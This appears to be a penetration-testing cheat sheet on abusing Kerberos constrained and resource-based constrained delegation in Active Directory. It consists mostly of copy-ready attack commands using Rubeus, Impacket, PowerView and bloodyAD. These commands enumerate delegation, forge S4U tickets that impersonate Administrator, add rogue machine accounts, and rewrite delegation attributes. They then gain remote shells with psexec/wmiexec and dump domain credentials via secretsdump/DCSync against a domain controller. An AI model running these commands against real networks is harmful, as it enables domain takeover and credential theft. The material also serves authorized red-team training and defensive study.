# Constrained and Resource-Based Constrained Delegation

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Constrained Delegation](#constrained-delegation)
- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
- [S4U Attack Chain](#s4u-attack-chain)
- [Abuse Scenarios](#abuse-scenarios)

---

## Overview

Kerberos Delegation allows services to impersonate users when accessing other services.

| Type | Description | Attribute |
| :--- | :--- | :--- |
| Unconstrained | Can impersonate to any service | `TRUSTED_FOR_DELEGATION` |
| Constrained | Can impersonate to specific services | `msDS-AllowedToDelegateTo` |
| RBCD | Resource defines who can delegate to it | `msDS-AllowedToActOnBehalfOfOtherIdentity` |

---

## Enumeration

### Find Constrained Delegation

> PowerView

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

> AD Module

```powershell
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

> Impacket

```shell
impacket-findDelegation $domain/$username:'$password' -dc-ip $rhost
```

### Find RBCD

> PowerView

```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl"}
```

> Check msDS-AllowedToActOnBehalfOfOtherIdentity

```powershell
Get-ADComputer $target_computer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

## Constrained Delegation

### With Protocol Transition (TrustedToAuthForDelegation)

> Get TGT for service account

```shell
impacket-getTGT $domain/$svc_account:'$password'
export KRB5CCNAME=svc_account.ccache
```

> Request service ticket as any user

```shell
impacket-getST -spn $target_spn -impersonate Administrator $domain/$svc_account -k -no-pass -dc-ip $rhost
```

> Use ticket

```shell
export KRB5CCNAME=Administrator@$target_spn@$domain.ccache
impacket-psexec -k -no-pass $target_host
```

### Using Rubeus (Windows)

> Get TGT

```powershell
.\Rubeus.exe asktgt /user:$svc_account /password:$password /domain:$domain /outfile:svc.kirbi
```

> S4U2Self + S4U2Proxy

```powershell
.\Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:Administrator /msdsspn:$target_spn /ptt
```

> Alternative SPN

```powershell
.\Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:Administrator /msdsspn:cifs/$target /altservice:host,http,wsman,ldap /ptt
```

### Without Protocol Transition

Need a valid TGS from user to impersonate.

> Request S4U2Proxy only (need valid forwarded TGS)

```powershell
.\Rubeus.exe s4u /ticket:svc.kirbi /tgs:user.kirbi /msdsspn:$target_spn /ptt
```

---

## Resource-Based Constrained Delegation (RBCD)

### Prerequisites

- Control over account with SPN (or ability to create machine account)
- WriteProperty on target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`

### Create Machine Account

> Impacket

```shell
impacket-addcomputer $domain/$username:'$password' -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip $rhost
```

> PowerMad

```powershell
New-MachineAccount -MachineAccount YOURPC -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

### Configure RBCD

> Using PowerView + PowerMad

```powershell
$ComputerSid = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $target_computer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

> Using Impacket rbcd.py

```shell
impacket-rbcd $domain/$username:'$password' -delegate-from 'YOURPC$' -delegate-to '$target_computer$' -action write -dc-ip $rhost
```

> Using bloodyAD

```shell
bloodyAD -u $username -p '$password' -d $domain --host $rhost add rbcd '$target_computer$' 'YOURPC$'
```

### Exploit RBCD

> Get service ticket

```shell
impacket-getST -spn cifs/$target_computer.$domain -impersonate Administrator -dc-ip $rhost $domain/'YOURPC$':'Password123!'
```

> Use ticket

```shell
export KRB5CCNAME=Administrator@cifs_$target_computer.$domain@$domain.ccache
impacket-psexec -k -no-pass $domain/Administrator@$target_computer.$domain
```

### Cleanup RBCD

> Remove delegation

```shell
impacket-rbcd $domain/$username:'$password' -delegate-from 'YOURPC$' -delegate-to '$target_computer$' -action remove -dc-ip $rhost
```

> Using bloodyAD

```shell
bloodyAD -u $username -p '$password' -d $domain --host $rhost del rbcd '$target_computer$' 'YOURPC$'
```

---

## S4U Attack Chain

### S4U2Self

Allows service to request TGS for any user to itself.

> Requires TRUSTED_TO_AUTH_FOR_DELEGATION or resource-based delegation

### S4U2Proxy

Allows service to use received TGS to request access to another service.

> Requires constrained delegation configuration

### Attack Flow

```text
1. Attacker controls: ServiceA (with delegation rights)
2. Target: ServiceB (target service on target computer)

S4U2Self: ServiceA â†’ KDC â†’ TGS(User â†’ ServiceA)
S4U2Proxy: ServiceA + TGS â†’ KDC â†’ TGS(User â†’ ServiceB)
Result: Access ServiceB as User
```

---

## Abuse Scenarios

### Scenario 1: Compromise Service Account with Constrained Delegation

```shell
# 1. Find delegating accounts
impacket-findDelegation $domain/$username:'$password' -dc-ip $rhost

# 2. Get TGT for service account
impacket-getTGT $domain/$svc_account:'$svc_password'

# 3. Request ticket as Administrator
impacket-getST -spn cifs/$target -impersonate Administrator -k -no-pass $domain/$svc_account

# 4. Use ticket
export KRB5CCNAME=Administrator@cifs_$target@$domain.ccache
impacket-secretsdump -k -no-pass $target
```

### Scenario 2: RBCD via GenericWrite on Computer

```shell
# 1. Check for GenericWrite on target computer
bloodyAD -u $username -p '$password' -d $domain --host $rhost getObjectAttributes '$target_computer$' nTSecurityDescriptor

# 2. Create machine account
impacket-addcomputer $domain/$username:'$password' -computer-name 'YOURPC$' -computer-pass 'Pass123!'

# 3. Configure RBCD
impacket-rbcd $domain/$username:'$password' -delegate-from 'YOURPC$' -delegate-to '$target_computer$' -action write

# 4. Get ticket and access
impacket-getST -spn cifs/$target_computer -impersonate Administrator $domain/'YOURPC$':'Pass123!'
export KRB5CCNAME=Administrator@cifs_$target_computer@$domain.ccache
impacket-wmiexec -k -no-pass $target_computer
```

### Scenario 3: Computer Account Takeover via RBCD

```shell
# If you have WriteProperty on DC
# 1. Add RBCD pointing to controlled machine
impacket-rbcd $domain/$username:'$password' -delegate-from 'YOURPC$' -delegate-to 'DC01$' -action write

# 2. Impersonate Administrator on DC
impacket-getST -spn cifs/DC01.$domain -impersonate Administrator $domain/'YOURPC$':'Pass123!'

# 3. DCSync
export KRB5CCNAME=Administrator@cifs_DC01.$domain@$domain.ccache
impacket-secretsdump -k -no-pass DC01.$domain
```

---

## Quick Reference

### Constrained Delegation Commands

| Tool | Command |
| :--- | :--- |
| Rubeus | `Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:Admin /msdsspn:cifs/target /ptt` |
| getST | `getST -spn cifs/target -impersonate Admin -k domain/svc$` |

### RBCD

| Step | Command |
| :--- | :--- |
| Create machine | `addcomputer domain/user:pass -computer-name YOURPC$ -computer-pass Pass!` |
| Add RBCD | `rbcd domain/user:pass -delegate-from YOURPC$ -delegate-to TARGET$ -action write` |
| Get ticket | `getST -spn cifs/target -impersonate Admin domain/YOURPC$:Pass!` |
| Access | `psexec -k -no-pass target` |

### Tools

| Tool | Description | URL |
| :--- | :--- | :--- |
| Rubeus | Windows Kerberos abuse | <https://github.com/GhostPack/Rubeus> |
| Impacket | Python AD tools | <https://github.com/fortra/impacket> |
| bloodyAD | AD privilege escalation | <https://github.com/CravateRouge/bloodyAD> |
| PowerMad | Machine account creation | <https://github.com/Kevin-Robertson/Powermad> |

---

## ðŸ“š See Also

### Related AD Attacks

- **[Kerberos Attacks](3.3.Kerberos-Attacks.md)** - Kerberoasting, AS-REP Roasting, Golden/Silver Tickets
- **[AD Exploitation](3.1.AD-Exploitation.md)** - BloodHound, Impacket, domain enumeration
- **[AD CS Attacks](3.5.AD-CS-Attacks.md)** - Certificate-based attacks (ESC1-ESC8)
- **[Shadow Credentials](3.6.Shadow-Credentials.md)** - msDS-KeyCredentialLink abuse

### Privilege Escalation

- **[Privilege Escalation Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Local Windows privesc
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - PsExec, WinRM after delegation abuse
